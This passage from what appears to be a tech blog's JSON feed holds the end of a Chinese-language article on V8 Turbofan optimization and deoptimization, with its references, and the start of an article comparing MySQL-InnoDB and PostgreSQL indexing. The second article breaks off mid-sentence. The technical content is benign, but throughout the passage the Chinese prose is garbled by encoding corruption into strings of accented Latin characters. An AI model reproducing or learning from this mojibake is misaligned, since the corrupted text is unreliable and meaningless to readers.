çš„åå„ªåŒ–ï¼ˆç•¢ç«Ÿæ˜¯å‚³å…¥åƒæ•¸çš„å•é¡Œï¼Œä¸¦ä¸æ˜¯å‹•åˆ°äº†åˆ¥çš„åœ°æ–¹çš„ object ) ã€‚ä¸¦ä¸”åœ¨æœ€å¾ŒåŸ·è¡Œäº† doSomething å‡½å¼è£¡é¢çš„ obj çš„ <strong>Materialization</strong>ã€‚[8]</p>\n<blockquote>\n<p><em>Materialization æ„å‘³è‘—çš„å°±æ˜¯åœ¨å„ªåŒ–æ™‚ï¼Œ Turbofan æŠŠ obj åšäº† â€œEscape Analysisâ€ (De-materialization)ï¼Œä¹Ÿå°±æ˜¯èªªå®ƒåˆ†æäº†é€™æ®µå‡½å¼çš„åŸ·è¡Œç‹€æ³ï¼Œèªå®š obj é€™å€‹ç‰©ä»¶å¾ä¾†éƒ½ä¸æœƒè„«é›¢ç•¶å‰çš„ scopeã€‚</em></p>\n</blockquote>\n<blockquote>\n<p><em>ä¸æœƒè„«é›¢ç•¶å‰ scope ä»£è¡¨çš„æ„ç¾©å°±æ˜¯å…¶å¯¦æ²’æœ‰å¿…è¦æŠŠ obj æ”¾åˆ° heap å»ï¼ˆæ”¾åˆ° Heap æœ€é‡è¦çš„æ„ç¾©å°±æ˜¯ç‚ºäº†è®“åˆ¥çš„ frame å¯ä»¥å­˜å–åˆ°ï¼‰ï¼Œ ç›´æ¥æŠŠ obj è£¡çš„property éƒ½è®Šæˆ local variable æ”¾åˆ° stack è£¡é¢ï¼Œå¯ä»¥ææ˜‡æ“ä½œé€Ÿåº¦ï¼ˆç•¢ç«Ÿæ”¾åˆ° heap çš„è©±å°±è®Šæˆè¦å…ˆå¾ stack è®€è®Šæ•¸åœ¨ heap çš„ä½ç½®å†å»æ‹¿ï¼‰ã€‚</em></p>\n</blockquote>\n<blockquote>\n<p>èˆ‰ä¾‹ä¾†èªªæˆ‘å€‘ä»¥ä¸Šçš„ code è‹¥åšäº† De-materializationï¼Œæœƒè®Šæˆé€™æ¨£çš„å½¢å¼</p>\n</blockquote>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/1__U__ToZYPMtzR8AZcc9cGqQA.png\" alt=\"\"><br>\n<img src=\"/img/posts/max/DiveIntoTurbofan/0__iyespGXRfBRYgYUm.png\" alt=\"\"></p>\n<blockquote>\n<p><em>ç•¶ç„¶ï¼Œé€™äº›å„ªåŒ–æ˜¯ä¸èƒ½åœ¨ Bytecode å±¤ç´šåšçš„ï¼Œæ‰€ä»¥æ—¢ç„¶è¦åå„ªåŒ–ï¼Œå°±è¡¨ç¤ºæˆ‘å€‘å¿…é ˆæŠŠ obj é‡æ–°æ”¾å› heap ï¼Œé€™å°±æ˜¯æ‰€è¬‚çš„ Materializationã€‚</em></p>\n</blockquote>\n<p>ä½†éš¨è‘—å¾ŒåŠçš„ iteration å‚³å…¥çš„å‹åˆ¥éƒ½æ˜¯ Stringï¼Œ Turbofan éäº†ä¸€æ®µæ™‚é–“å†æ¬¡æŠŠ doSomething ç·¨è­¯æˆäº†é‡å°å­—ä¸²åƒæ•¸çš„æ©Ÿå™¨ç¢¼ã€‚</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0__AWTn6yUGsGVEZEgf.png\" alt=\"\"></p>\n<p>å…¶å¯¦å¾ä¸Šé¢çš„ trace å¯ä»¥çœ‹å‡ºä¾†ï¼ŒåŸ·è¡Œå‹•æ…‹å„ªåŒ–å’Œåå„ªåŒ–èŠ±è²»çš„æ™‚é–“å¤§å¤šéƒ½åœ¨ 1ms ä»¥ä¸‹ï¼Œç„¶è€Œæœ€å¾Œçš„åŸ·è¡Œæ™‚é–“å»æœ‰å¦‚æ­¤å¤§çš„å·®ç•°ï¼Œæ‡‰è©²ä¸é›£æƒ³åƒåŸ·è¡Œå„ªåŒ–å‰è·Ÿå„ªåŒ–å¾Œçš„ä»£ç¢¼çš„æ•ˆç‡æœ‰å¤šå¤§çš„å·®ç•°äº†ã€‚</p>\n<p>å†ä¾†æˆ‘å€‘çœ‹çœ‹é€™æ®µç¨‹å¼ç¢¼çš„æ•ˆç‡</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0__4P7hndqriK0eWdQN.png\" alt=\"\"><br>\n<img src=\"/img/posts/max/DiveIntoTurbofan/0__KEMsyBqrOWpWdash.png\" alt=\"\"></p>\n<p>ä¸é›£çœ‹å‡ºï¼Œå¦‚æœæ¯æ¬¡å‘¼å« doSomething æ™‚çš„åƒæ•¸å‹åˆ¥éƒ½æŒçºŒè®ŠåŒ–ï¼Œå°æ–¼ Turbofan ä¾†èªªæ˜¯å¾ˆé›£é€²è¡Œæœ‰æ•ˆç‡çš„å„ªåŒ–çš„ã€‚ é€™ä¹Ÿæ­£æ˜¯ç‚ºä»€éº¼å¯« JS æ™‚æˆ‘å€‘æ‡‰è©²è¦ç›¡å¯èƒ½éµå®ˆå›ºå®šåƒæ•¸å‹åˆ¥çš„åŸå› ã€‚ï¼ˆ å¾å¦ä¸€æ–¹é¢ä¾†çœ‹ï¼Œä½¿ç”¨ Typescript ä¹Ÿæ˜¯æœ‰åŸ·è¡ŒæœŸæ•ˆç‡çš„è€ƒé‡ï¼Œç•¢ç«Ÿå‹åˆ¥éƒ½å›ºå®šäº†ï¼Œå°ç·¨è­¯å™¨ä¾†èªªå¾ˆå¥½å„ªåŒ–ï¼‰</p>\n<p>æ¥è‘—è€ƒæ…®ä»¥ä¸‹é€™æ®µ code</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0__frVKSQdgjWzqL__Ls.png\" alt=\"\"><br>\n<img src=\"/img/posts/max/DiveIntoTurbofan/0__L6lZmMx5NWshUaI__.png\" alt=\"\"></p>\n<p>å¦‚æœæˆ‘å€‘æŠŠ <strong>yoo (obj)</strong> é€™è¡Œçš„è¨»è§£æ‹¿æ‰ï¼Œå°±ç¬¦åˆäº†æˆ‘å€‘ä¸Šé¢æ‰€è¬›çš„ï¼Œ Stack Top çš„ Frame æ›´æ”¹äº†æœƒè¢«å…¶ä»–åœ°æ–¹å­˜å–çš„è®Šæ•¸çš„ Shape çš„ç‹€æ³ã€‚é€™æœƒè®“ couter += obj.x é€™è¡Œæ©Ÿå™¨ç¢¼æŒ‡ä»¤å› ç‚º obj çš„å½¢ç‹€æ”¹è®Šè€Œå¤±æ•ˆã€‚ æˆ‘å€‘å°å‡ºä»–çš„ trace-opt:</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0__RBX4Eyd__16Ud7A__x.png\" alt=\"\"><br>\n<img src=\"/img/posts/max/DiveIntoTurbofan/0__kSr7ZNJFmbrhn1QG.png\" alt=\"\"></p>\n<p>æˆ‘å€‘å¯ä»¥çœ‹åˆ°ï¼Œé€™æ¬¡çš„ Deoptimization æ˜¯ soft æ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢æ‰€è«‡çš„ Lazy Deoptimizationã€‚</p>\n<h3 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> çµè«–</h3>\n<p>é€™ç¯‡æ–‡ç« ä»‹ç´¹äº† V8 å¼•æ“å’Œ Turbofan åŸ·è¡Œå¤§å®¶çš„ JS Code æ™‚çš„å„ªåŒ–æ–¹å¼è·ŸåŸç†ã€‚ å¯«å‡ºä¾†çš„ code è¶Šç©©å®šå¥½åˆ†æï¼Œç·¨è­¯å™¨å°±å¯ä»¥åšè¶Šé€²éšçš„å„ªåŒ–ã€‚</p>\n<p>å…¶å¯¦çµ•å¤§å¤šæ•¸çš„ Web Applicationéƒ½æ˜¯ IO-Bound çš„ï¼Œå¦‚ä½•å¯«å‡ºè®“ Compiler å¥½å„ªåŒ–çš„ Code å¯èƒ½åœ¨å¾ˆå¤šæ™‚å€™éƒ½ä¸æ˜¯å€‹å¾ˆé—œéµçš„å•é¡Œï¼Œç•¢ç«Ÿå¯«å‡ºè®“ç·¨è­¯å™¨å¥½å„ªåŒ–çš„ç¨‹å¼ç¢¼å¯èƒ½æœƒç ´å£è¨±å¤šæ˜“ç”¨å¥½ç¶­è­·çš„è»Ÿé«”è¨­è¨ˆåŸå‰‡ã€‚ ä½†å„˜ç®¡å¦‚æ­¤ï¼Œä½œç‚º Web é–‹ç™¼è€…ç›¸ä¿¡å° JS èƒŒå¾Œçš„åŸ·è¡Œç’°å¢ƒæœ‰æ·±ä¸€å±¤çš„èªè­˜ä¹Ÿæ˜¯ä¸€ä»¶é‡è¦çš„äº‹ã€‚</p>\n<p>ï¼Šè¨»ä¸€ ï¼š TurboFan æ‰€æ¡å–çš„ Sea-of-Nodes æ˜¯ç·¨è­¯å™¨ç”¨ä¾†è¡¨ç¤ºç¨‹å¼è¡Œç‚ºçš„è¡¨ç¤ºæ–¹å¼çš„ä¸€ç¨®ã€‚ç›¸æ¯”å‚³çµ±ä¸Šå¸¸ç”¨çš„ Control Flow Graph åœ¨åšæŒ‡ä»¤çš„ Scheduling æ™‚æŠŠ Basic block ç•¶ä½œ Scheduling çš„åŸå­å–®ä½ï¼Œ Sea-of-Nodes æŠŠæ‰€æœ‰çš„è³‡æ–™è·Ÿæ“ä½œéƒ½è®Šæˆå–®ä¸€çš„ç¯€é»ï¼Œä¸¦ç”¨ Effect-edge ä¾†ç¶­æŒç¨‹å¼æµç¨‹ä¸­çš„ State é—œä¿‚ï¼Œæå‡äº† Scheduling çš„å½ˆæ€§ã€‚ æœ‰èˆˆè¶£çš„äººå¯ä»¥åƒè€ƒ [1]å’Œ[4]ã€‚</p>\n<p>ï¼Šè¨»äºŒï¼š V8 å¼•æ“ä¸­ï¼Œå…·æœ‰ç›¸åŒçš„ Shapeï¼ˆ object ä¸­æ‰€æœ‰ attribute çš„ type å’Œname) çš„ object éƒ½æœƒå°æ‡‰åˆ°ä¸€å€‹ç›¸åŒçš„ Mapï¼Œç¨±ä¹‹ç‚º Hidden classï¼Œè£¡é¢å­˜æ”¾äº†é€™äº› attribute åœ¨ memory layout ä¸­å›ºå®šçš„ offsetï¼Œæ˜¯ V8 ç‚ºäº†åŠ é€Ÿè¨˜æ†¶é«”å­˜å–é€Ÿåº¦è€Œå‡ºç¾çš„è¨­è¨ˆã€‚[6]</p>\n<h3 id=\"references%3A\"><a class=\"direct-link\" href=\"#references%3A\">#</a> References:</h3>\n<p>[1] Turbofan JIT Design <a href=\"https://docs.google.com/presentation/d/1sOEF4MlF7LeO7uq-uThJSulJlTh--wgLeaVibsbb3tc/edit#slide=id.g5499b9c42_01170\">https://docs.google.com/presentation/d/1sOEF4MlF7LeO7uq-uThJSulJlTh--wgLeaVibsbb3tc/edit#slide=id.g5499b9c42_01170</a></p>\n<p>[2] An overview of Turbofan Compiler <a href=\"https://docs.google.com/presentation/d/1H1lLsbclvzyOF3IUR05ZUaZcqDxo7_-8f4yJoxdMooU/edit#slide=id.g18ceb14729_0_124\">https://docs.google.com/presentation/d/1H1lLsbclvzyOF3IUR05ZUaZcqDxo7_-8f4yJoxdMooU/edit#slide=id.g18ceb14729_0_124</a></p>\n<p>[3] Turbofan IR <a href=\"https://docs.google.com/presentation/d/1Z9iIHojKDrXvZ27gRX51UxHD-bKf1QcPzSijntpMJBM/edit#slide=id.g19134d40cb_0_0\">https://docs.google.com/presentation/d/1Z9iIHojKDrXvZ27gRX51UxHD-bKf1QcPzSijntpMJBM/edit#slide=id.g19134d40cb_0_0</a></p>\n<p>[4] An Introduction to TurboFan<br>\nÂ <a href=\"https://www.mdeditor.tw/pl/po7T/zh-tw\">https://www.mdeditor.tw/pl/po7T/zh-tw</a></p>\n<p>[5] Deoptimization in V8 <a href=\"https://docs.google.com/presentation/d/1Z6oCocRASCfTqGq1GCo1jbULDGS-w-nzxkbVF7Up0u0/edit#slide=id.g19ea708688_0_10\">https://docs.google.com/presentation/d/1Z6oCocRASCfTqGq1GCo1jbULDGS-w-nzxkbVF7Up0u0/edit#slide=id.g19ea708688_0_10</a></p>\n<p>[6] V8 Hidden classÂ <br>\n<a href=\"https://engineering.linecorp.com/en/blog/v8-hidden-class/\">https://engineering.linecorp.com/en/blog/v8-hidden-class/</a></p>\n<p>[7] V8 Function OptimizationÂ <br>\n<a href=\"https://erdem.pl/2019/08/v-8-function-optimization\">https://erdem.pl/2019/08/v-8-function-optimization</a></p>\n<p>[8] Escape Analysis in V8<br>\nÂ <a href=\"https://www.youtube.com/watch?v=KiWEWLwQ3oI\">https://www.youtube.com/watch?v=KiWEWLwQ3oI</a></p>\n<p>[9] Turbofan Inlining Heuristics <a href=\"https://docs.google.com/document/d/1VoYBhpDhJC4VlqMXCKvae-8IGuheBGxy32EOgC2LnT8/edit\">https://docs.google.com/document/d/1VoYBhpDhJC4VlqMXCKvae-8IGuheBGxy32EOgC2LnT8/edit</a></p>\n<p>[10] JavaScript engine fundamentals: Shapes and Inline Caches<br>\n<a href=\"https://mathiasbynens.be/notes/shapes-ics\" title=\"https://mathiasbynens.be/notes/shapes-ics\">https://mathiasbynens.be/notes/shapes-ics</a></p>\n",
      "date_published": "2021-04-07T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/maxchiu/indexing/",
      "url": "https://tech-blog.cymetrics.io/posts/maxchiu/indexing/",
      "title": "å¾Indexingçš„è§’åº¦åˆ‡å…¥MySQL-Innodbèˆ‡PostgreSQLçš„æ•ˆèƒ½æ¯”è¼ƒ",
      "content_html": "<p><img src=\"/img/posts/max/IndexingComparisonOfMySQLAndPostgres/1__D99fysQ1Z0zfpa390g4QvQ.gif\" alt=\"\"></p>\n<p>å¦‚æœä½ ç”¨çš„è³‡æ–™åº«æ˜¯å±¬æ–¼ Relational Database ï¼Œåœ¨é€™å€‹å¹´ä»£ç”¨SQLé€²è¡Œè³‡æ–™åº«çš„å­˜å–å·²ç¶“è®Šæˆä¸€ä»¶ç†æ‰€ç•¶ç„¶çš„äº‹äº†ã€‚MySQL ã€PostgreSQL ã€MsSQLâ€¦ä¸è«–æ˜¯é–‹æºæŠ‘æˆ–æ˜¯ç”±å¤§å» ä¸»å°çš„ SQL å°ˆæ¡ˆéƒ½æ“æœ‰å„è‡ªçš„æ“è­·è€… ã€‚</p>\n<p>å…¶å¯¦å¦‚æœå–®ç´”ä»¥ä½¿ç”¨èˆ‡æ“ä½œçš„è§’åº¦å»é€™äº›ä¸åŒçš„è³‡æ–™åº«çš„å®˜ç¶²å’Œ document çœ‹éä¸€åœˆï¼Œå¯èƒ½ä¸å¤ªå®¹æ˜“çœ‹å‡ºæœ‰ä»€éº¼é—œéµæ€§çš„å·®ç•°ã€‚ç„¶è€Œå„˜ç®¡é€™äº›è³‡æ–™åº«åœ¨è¡¨é¢ä¸Šçœ‹èµ·ä¾†éƒ½æä¾›äº†é¡ä¼¼ Function ï¼Œä½†æ˜¯å°æ–¼åŒæ¨£çš„ä¸€å€‹é‚è¼¯ï¼Œ ä¸åŒå®¶çš„è³‡æ–™åº«ä¹‹é–“çš„åº•å±¤çš„ç‰©ç†å¯¦ä½œå»æœ‰ä¸å°‘å¤§ç›¸å¾‘åº­çš„åœ°æ–¹ã€‚</p>\n<!-- summary -->\n<p>é€™ç¯‡æ–‡ç« æƒ³è¦ä»¥ MySQL (åœ¨æœ¬æ–‡ä¸­æ‰€åƒè€ƒçš„å„²å­˜å¼•æ“ç‚º innodb ) å’ŒPostgreSQL ç‚ºä¾‹ï¼Œä¾†è¨è«–ä¸€äº› Relational Database åœ¨åº•å±¤æ“ä½œè³‡æ–™æ™‚çš„ä¸€äº›åŸºæœ¬åŸç†ã€‚ æ›´ç¢ºåˆ‡åœ°èªªï¼Œå¾DBç³»çµ±ç®¡ç†Indexçš„æ–¹å¼ä¾†åˆ‡å…¥ã€‚</p>\n<!-- summary -->\n<h3 id=\"indexes-%3A-%E6%B1%BA%E5%AE%9A%E8%B3%87%E6%96%99%E5%AD%98%E5%8F%96%E9%80%9F%E5%BA%A6%E7%9A%84%E9%97%9C%E9%8D%B5\"><a class=\"direct-link\" href=\"#indexes-%3A-%E6%B1%BA%E5%AE%9A%E8%B3%87%E6%96%99%E5%AD%98%E5%8F%96%E9%80%9F%E5%BA%A6%E7%9A%84%E9%97%9C%E9%8D%B5\">#</a> IndexesÂ : æ±ºå®šè³‡æ–™å­˜å–é€Ÿåº¦çš„é—œéµ</h3>\n<p>é¦–å…ˆä¾†è«‡è«‡ MySQL å’Œ PostgreSQL åœ¨è³‡æ–™å„²å­˜ä¸Šæœ€é—œéµçš„å·®ç•°Â : Indexes ã€‚</p>\n<p><a href=\"https://www.tutorialspoint.com/mysql/mysql-indexes.htm\">ç¶²è·¯ä¸Šçš„æ•™å­¸</a>éƒ½æœƒèªªï¼Œ å°æ–¼ table ä¸­ç¶“å¸¸éœ€è¦ç”¨ä¾†ç•¶ä½œæŸ¥è©¢ä¾æ“šçš„ column ï¼ŒæŠŠå®ƒè¨­æˆ index é€Ÿåº¦å°±æœƒæå‡ã€‚é€™èƒŒå¾Œçš„åŸå› æ˜¯å› ç‚ºå°æ–¼è³‡æ–™åº«èƒŒå¾Œå„²å­˜è³‡æ–™çš„ Data structure ä¾†èªª ï¼Œè¢«é¸ç‚º Index çš„ Column å°±æœƒæˆç‚ºè³‡æ–™çµæ§‹ä¸­çš„æ’åºä¾æ“šã€‚</p>\n<p>â€œå‡è¨­â€æŸå€‹è³‡æ–™åº«èƒŒå¾Œæ˜¯ç”¨ <a href=\"https://en.wikipedia.org/wiki/Binary_tree\">Binary Tree</a>ï¼ˆå¯¦éš›ä¸Šé€šå¸¸æ˜¯ <a href=\"https://zh.wikipedia.org/wiki/B%E6%A0%91\">B-Tree</a> çš„å„ç¨®å»¶ä¼¸ç‰ˆæœ¬ï¼‰ä¾†ç•¶ä½œæ ¸å¿ƒè³‡æ–™çµæ§‹çš„è©±ï¼Œä¸€ç­†è³‡æ–™çš„ row å°±æ˜¯ä¸€å€‹ nodeã€‚ é‚£ä¾‹å¦‚èªªåœ¨ä¸‹åœ–çš„è³‡æ–™çµæ§‹ï¼Œä¸€ç­†è³‡æ–™æœƒæœ‰Nameã€Heightã€id ä¸‰å€‹æ¬„ä½ï¼Œé‚£ç•¶æˆ‘å€‘æŠŠæ¬„ä½ â€œ idâ€ è¨­ç‚º indexçš„è©± ï¼Œé€™æ£µæ¨¹ï¼ˆä¹Ÿå°±æ˜¯è³‡æ–™åº«å­˜æ”¾è³‡æ–™çš„çµæ§‹ï¼‰å°±æœƒç…§è‘— id çš„å€¼ä¾†æ’åºã€‚</p>\n<p><img src=\"/img/posts/max/IndexingComparisonOfMySQLAndPostgres/0__lAtWJh8SO8RBVIxR.png\" alt=\"\"></p>\n<p>çœ‹åˆ°é€™è£¡æœ‰è‡ªå·±è¨­è¨ˆé DB Schema çš„æœ‹å‹å€‘å¯èƒ½å°±æœƒå¥½å¥‡ï¼Œ</p>\n<blockquote>\n<p>â€œå’¦ä½†æ˜¯æœ‰æ™‚å€™æˆ‘åŒä¸€å¼µ table è£¡é¢æœƒæœ‰å¥½å¹¾å€‹ column æœƒè¨­æˆ index è€¶</p>\n</blockquote>\n<blockquote>\n<p>é‚£é€™æ¨£è³‡æ–™åº«è¦ä»¥å“ªå€‹ç‚ºåŸºæº–æ’åºå•Šï¼Ÿâ€</p>\n</blockquote>\n<p>åœ¨è¨è«–é€™å€‹å•é¡Œå‰æˆ‘å€‘å¿…é ˆå…ˆç­è§£å…©å€‹æ¦‚å¿µï¼šclustered index å’Œ non-clustered indexã€‚</p>\n<h3 id=\"clustered-index-%E8%88%87-non-clustered-index\"><a class=\"direct-link\" href=\"#clustered-index-%E8%88%87-non-clustered-index\">#</a> Clustered Index èˆ‡ Non-Clustered Index</h3>\n<p>å¦‚æœè¦ç”¨ä¸€å¥è©±æ¦‚æ‹¬èªªæ˜é€™å…©è€…çš„å·®ç•°ï¼Œå¯ä»¥èªª Clustered Index æ˜¯â€œå®Œæ•´è³‡æ–™(åŒ…å«æ‰€æœ‰ columnï¼‰åœ¨ Storage ä¸­å¯¦éš›ä¸Šçš„æ’åºä¾æ“š â€ è€Œ Non-clustered Indexå‰‡æ˜¯ â€œè·Ÿå®Œæ•´è³‡æ–™åˆ†é–‹ä¾†æ”¾çš„æ¬„ä½å­é›†åˆçš„æ’åºä¾æ“šâ€ã€‚</p>\n<p>èªªå¾—ç™½è©±ä¸€é»å°±æ˜¯å®Œæ•´çš„è³‡æ–™åœ¨ storage è£¡é¢ç”¨ clustered-index ç•¶ä½œæ’åºä¾æ“šï¼Œ clustered-index ç›¸è¿‘çš„è³‡æ–™åœ¨ storage ä¸­ä¹Ÿæœƒåœ¨æ¯”è¼ƒæ¥è¿‘çš„ä½ç½®ã€‚ ä¸”å› çˆ²ä»–æ˜¯å¯¦éš›ä¸Š storage åœ¨ partition è³‡æ–™æ™‚çš„ä¾æ“šï¼Œæ‰€ä»¥åªèƒ½æœ‰ä¸€å€‹ clustered indexã€‚</p>\n<p>è€Œè³‡æ–™åº«æœƒå¦å¤–è¤‡è£½å¹¾ä»½è¢«ä½¿ç”¨è€…é¸ç‚º non-clustered index çš„ column è³‡æ–™ï¼Œ åœ¨å…¶ä»– storage çš„ç©ºé–“å‰µé€ åªåŒ…å«é€™äº› non-clustered index çš„è³‡æ–™çµæ§‹ã€‚æ¯å¤šä¸€å€‹ index å°±å¤šå‰µé€ ä¸€ä»½ã€‚è€Œé€™äº› non-clustered index è·Ÿå¯¦éš›ä¸Š storageä¸­çš„è³‡æ–™çš„ç‰©ç†ä½ç½®æ²’æœ‰ç›´æ¥çš„é—œé€£ã€‚</p>\n<p>ä»¥ä¸Šé¢çš„ä¾‹å­ç‚ºä¾‹ï¼Œ idï¼ˆé è¨­æ˜¯ Primary Keyï¼‰å°±æ˜¯ clustered index ï¼Œè€Œå¦‚æœä½¿ç”¨è€…åœ¨ name å’Œ height ä¸Šéƒ½ create index çš„è©±ï¼ˆé è¨­ç‹€æ³ create æ–°çš„ index å°±æ˜¯ non-clustered indexï¼‰ï¼Œè³‡æ–™åº«æœƒå‰µé€ å‡ºé¡å¤–çš„å…©ä»½è¤‡è£½çš„å­é›†åˆè³‡æ–™çµæ§‹ã€‚</p>\n<p><img src=\"/img/posts/max/IndexingComparisonOfMySQLAndPostgres/0__vIig59JPmcPAXOZ9.png\" alt=\"\"><br>\n<img src=\"/img/posts/max/IndexingComparisonOfMySQLAndPostgres/0__vsWcHf9LzLOdY__D3.png\" alt=\"\"></p>\n<p>é€™å…©å€‹æ–°çš„ tree åˆ†åˆ¥å„è‡ªä»¥ä¸åŒçš„ non-clustered index é€²è¡Œæ’åº.ã€‚ç•¶ä½¿ç”¨è€…è¦æŸ¥è©¢è³‡æ–™æ™‚ï¼Œ è³‡æ–™åº«å°±æœƒå¾åˆ¤æ–·æŒ‡ä»¤ä¸­çš„æ¢ä»¶ä½¿ç”¨çš„æ¬„ä½æ˜¯å¦æ˜¯æœ‰è¢«è¨­ç‚ºindex çš„æ¬„ä½ï¼Œæœ‰çš„è©±å°±æœƒå¾å°æ‡‰çš„ tree è£¡é¢å°‹æ‰¾ã€‚</p>\n<p>ä¾‹å¦‚ä¸‹ <strong>SELECT * WHERE Height &gt; 165</strong> ï¼Œè³‡æ–™åº«ä¸æœƒå¾åœ–ä¸€ä¸­åŸæœ¬åŒ…å«å®Œæ•´è³‡æ–™çš„çµæ§‹ä¸­å°‹æ‰¾ï¼Œ è€Œæ˜¯æœƒå¾è¤‡è£½å‡ºä¾†çš„åœ–äºŒçš„çµæ§‹ä¸­å°‹æ‰¾å°æ‡‰çš„ nodeã€‚</p>\n<p>ç„¶è€Œçœ¼å°–çš„æœ‹å‹å¯èƒ½ç™¼ç¾, å¦‚æœæ˜¯**SELECT ***çš„è©±ï¼Œå°±ç®—åœ¨åœ–äºŒçš„ tree ä¸­æ‰¾åˆ°äº†éœ€è¦çš„ nodesï¼Œè£¡é¢ä¹Ÿæ²’æœ‰åŒ…å«å…¶ä»–æ¬„ä½çš„è³‡æ–™è®“æˆ‘å›å‚³å•Šï¼</p>\n<p>ä¸€å€‹å¯èƒ½çš„è§£æ³•æ˜¯åœ¨ create index æ™‚ä¸‹<strong>INCLUDE</strong> clause ï¼Œå¯ä»¥è®“è³‡æ–™åº«åœ¨å‰µå»ºæ–°çš„ non-clustered index tree æ™‚æŠŠè¢« include çš„æ¬„ä½è³‡æ–™ä¸€èµ·æ”¾é€²å»ã€‚ ä½†æ˜¯å¦‚æœ table ä¸­çš„æ¬„ä½å¾ˆå¤šï¼Œé‚£é€™æ¨£æ¯æ¬¡è¦ create æ–°çš„ index æ™‚å‰µé€ å‡ºä¾†çš„æ–°çš„tree å°±æœƒç„¡æ•µå¤§ï¼Œå° storage æ˜¯ä¸€å€‹å¤§è² è·ã€‚</p>\n<p>æ‰€ä»¥å¯¦éš›ä¸Šé™¤äº†ç”¨ clustered index æ’åºçš„åŸæœ¬è³‡æ–™å¤–ï¼Œé€™äº›é¡å¤–çš„ index treeçš„ç¯€é»éƒ½é‚„åŒ…æ‹¬äº†ä¸€å€‹ fieldï¼Œæ”¾çš„æ­£æ˜¯ clustered indexã€‚ ä¾‹å¦‚åœ–äºŒä»¥ height ç•¶non-clustered index çš„ tree ä¸­å¯¦éš›ä¸Šæœƒæœ‰é¡å¤–å°æ‡‰çš„ clustered index (æ­¤ä¾‹ä¸­ä¹Ÿå°±æ˜¯ id )</p>\n<p><img src=\"/img/posts/max/IndexingComparisonOfMySQLAndPostgres/0__oM__jfRfuw6nkKmE5.png\" alt=\"\"></p>\n<p><strong>SELECT * WHERE Height &gt; 165</strong>é€™å€‹æŒ‡ä»¤åœ¨æŸ¥è©¢æ™‚å°±æœƒè®Šæˆå…ˆå¾æ­¤æ¨¹ä¸­æ‰¾åˆ°ç¬¦åˆæ¢ä»¶çš„nodeï¼Œå†ç”¨å°æ‡‰çš„clustered index(id)å»åœ–ä¸€ä¸­çš„æ¨¹æŸ¥è©¢ã€‚</p>\n<p><img src=\"/img/posts/max/IndexingComparisonOfMySQLAndPostgres/0__FgE15QZVAhf__hZhu.png\" alt=\"\"></p>\n<p>ä»¥ä¸Šé€™å€‹æµç¨‹å°±æ˜¯ ï¼­ySQL-Innodb ä¸­ç”¨ index åŠ é€Ÿè³‡æ–™æŸ¥è©¢çš„æµç¨‹å’ŒåŸç†</p>\n<p>çœ‹ä¾†å¾ˆå®Œç¾ï¼ æ”¶å·¥ï½</p>\n<p>..</p>\n<p>â€¦</p>\n<p>â€¦â€¦</p>\n<p>ç„¶è€Œç¾å¯¦ç¸½æ˜¯æ®˜é…·çš„ï¼Œ é€™æ¨£çš„æµç¨‹æœ‰å€‹æ½›åœ¨çš„å¤§å•é¡Œã€‚</p>\n<p>å…ˆå¾ non-clustered index å–å¾— clustered index å†å»æŸ¥è©¢ï¼Œçœ‹èµ·ä¾†åªæ˜¯å¾æŸ¥è©¢ä¸€æ¬¡è®Šæˆå…©æ¬¡è€Œå·²ï¼Œ ç„¶è€Œå¯¦éš›ä¸Šå¦‚æœé€²è¡Œéå¸¸å¤§ç¯„åœçš„Range Queryï¼Œ non-clustered indexä¸€å€‹rangeä¸­å°æ‡‰çš„clustered-indexè³‡æ–™åœ¨å¯¦éš›ç¡¬ç¢Ÿçš„å­˜æ”¾ä½ç½®æ˜¯éå¸¸æ•£äº‚çš„ï¼Œé€™å€‹æŸ¥è©¢clustered-index treeçš„æ­¥é©Ÿæœƒåœ¨Storageä¸­ç™¼ç”Ÿéå¸¸å·¨é‡çš„Random Access,æ•ˆèƒ½çš„å¤§å¹…ä¸‹é™æ˜¯å¯ä»¥é æœŸã€‚</p>\n<p>å¦‚æœæˆ‘å€‘æƒ³è¦ Select å…¨éƒ¨çš„æ¬„ä½ï¼Œä½†æ˜¯å»ä¸æƒ³è¦å›å» clustered-index tree è£¡é¢æŸ¥è©¢ï¼Œ æœ‰è¾¦æ³•å—ï¼Ÿ</p>\n<h3 id=\"postgresql%E7%9A%84%E8%A7%A3%E6%B3%95%EF%BC%9A\"><a class=\"direct-link\" href=\"#postgresql%E7%9A%84%E8%A7%A3%E6%B3%95%EF%BC%9A\">#</a> PostgreSQLçš„è§£æ³•ï¼š</h3>\n<p>PostgreSQLçœ‹åˆ°äº† MySQL-Innodb ä¸­é€™æ¨£çš„ç—›é»ï¼Œ æ‰€ä»¥åœ¨è¨­è¨ˆä¸Šæ¡å–äº†ä¸€å€‹ç­–ç•¥ ï¼š ä¸ä½¿ç”¨ clustered index treeã€‚</p>\n<p>æ²’æœ‰ clustered index æ„å‘³è‘—çš„å°±æ˜¯å®Œæ•´çš„åŸå§‹è³‡æ–™ç„¡æ³•é€²è¡Œæ’åºï¼ˆå› ç‚ºæ²’æœ‰æ’åºçš„ä¾æ“šï¼‰ åœ¨ PostgreSQL çš„ä¸­å­˜æ”¾å®Œæ•´è³‡æ–™çš„åœ°æ–¹ç¨±ä¹‹ç‚º Heapã€‚ é€™å€‹Heap æ˜¯å€‹ç„¡åºçš„çµæ§‹ï¼Œæ¯ä¸€ç­†è³‡æ–™å­˜åœ¨ storage ä¸­æ˜¯ä¸çµ¦äºˆé€™äº›è³‡æ–™é †åºä»»ä½•çš„ä¿è­‰çš„ã€‚</p>\n<p>è€Œ non-clustered index çš„éƒ¨åˆ†,ï¼ŒPostgreSQL å‰‡æ˜¯å¾åœ¨æ¯å€‹ node è£¡é¢å„²å­˜Clustered-indexï¼Œæ”¹æˆå„²å­˜ä¸€å€‹æŒ‡å‘ Heap ä¸­å°æ‡‰å®Œæ•´è³‡æ–™çš„ row æ‰€åœ¨ä½ç½®çš„æŒ‡æ¨™. (æ³¨æ„æ­¤è™•çš„æŒ‡æ¨™ä¸æ˜¯ memory 